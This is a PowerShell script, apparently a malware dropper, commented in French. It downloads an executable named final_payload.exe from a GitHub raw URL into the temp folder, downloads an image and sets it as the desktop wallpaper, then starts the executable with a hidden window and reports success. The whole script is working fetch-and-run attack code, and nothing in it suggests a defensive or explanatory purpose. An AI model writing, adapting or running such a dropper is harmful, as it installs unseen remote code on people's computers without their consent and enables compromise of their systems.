# final_payload.ps1
try {
    # URL CORRIGÉE - utilisez raw.githubusercontent.com
    $payloadUrl = "https://raw.githubusercontent.com/FogBound-IT/test/main/final_payload.exe"
    $payloadPath = "$env:TEMP\final_payload.exe"
    
    (New-Object System.Net.WebClient).DownloadFile($payloadUrl, $payloadPath)
    
    # Image (déjà correcte)
    $imageUrl = "https://raw.githubusercontent.com/FogBound-IT/test/793235c441ddaec513ddb5699b33a2cff3b285aa/thumb-1920-423529.jpg"
    $imagePath = "$env:TEMP\anonymous.jpg"
    (New-Object System.Net.WebClient).DownloadFile($imageUrl, $imagePath)
    
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Wallpaper {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
"@
    [Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 3)
    Start-Process -FilePath $payloadPath -WindowStyle Hidden
    Write-Host "Opération terminée avec succès"
} catch {
    Write-Host "Erreur: $($_.Exception.Message)"
}